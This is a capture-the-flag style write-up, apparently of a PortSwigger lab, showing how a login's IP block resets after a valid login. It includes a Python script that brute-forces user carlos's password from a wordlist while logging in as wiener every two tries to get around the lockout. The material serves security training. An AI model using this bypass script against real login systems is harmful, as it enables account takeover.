# Authentication Vulnerabilities

<h3> Broken brute-force protection, IP block</h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/503c5d03-8fab-4ecd-93be-77c2e1a16e64)

Going over to the web app shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db03e8c5-4227-485b-9051-4a96584bede6)

But since we're interested in the login page I went there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/411fdbb1-67db-49d8-8beb-a640a8884278)

First thing we should note is that we're already given a cred to login as `wiener:peter` but the goal is to brute force the user `carlos` password with the password wordlist given

Let us login as the user *wiener* first
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8d66fd76-235f-4da4-9395-6001a09673e3)

It works cool. When we try loggin in as user carlos with a random cred it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e6ee17ee-7936-41e2-94bb-f198501862c9)

And after the third attempt of trying random password it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d5dbd879-c1aa-4d34-80db-1390c6e3ab69)

Hmmmm we've been blocked for one minute

After waiting for a minute and then trying to login as user *wiener* works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e6238793-bfe4-437a-8f87-e597bc785b2f)

I logged out then tried loggin in as user carlos with random password but for just two request
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a0b860a9-8975-4a48-8c79-807a8a91642c)

Then the third request I logged in as user wiener and it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/249e4a48-e522-4124-803f-852803064425)

So now the logic behind this login function is that:
- After two failed login we get incorrect password as expected
- Then the third login when tried with a valid cred works which prevents the the web app from blocking our IP

Cool with this we know that we can brute force the user's password for every two requests made and the third request we will login as weiner

I made a script for that though *Portswigger* recommended a burp extension
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2392dd57-3372-4b21-8781-612ee1ef8f79)

Here's my script 

```python
#!/usr/bin/python3
import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

with open('passwords.txt', 'r') as f:
    passwords = [passwd.strip() for passwd in f.readlines()]

url = 'https://0a42008903a8b19183b582120062005e.web-security-academy.net/login'

data = {
    'username': 'carlos',
    'password': ''
}

valid_cred = {
    'username': 'wiener',
    'password': 'peter'
}

# Make a valid request to prevent IP Block
req = requests.post(url, data=valid_cred, verify=False, allow_redirects=True)

count = 0

for password in passwords:
    data['password'] = password
    req = requests.post(url, data=data, verify=False)

    if 'Incorrect password' not in req.text:
        print(f'Password found: {password}')
        break

    count += 1

    # On every 3rd request bypass IP blocker by logging in with valid cred
    if count == 2:
        print(f'Trying: {password}')
        req = requests.post(url, data=valid_cred, verify=False)

        count = 0
```

Running it gives the password
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a37c4341-dd38-491a-a0a1-bf0c83de5afd)

And automatically it shows solved
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38123a6b-bac9-492a-b674-a3f050160a32)



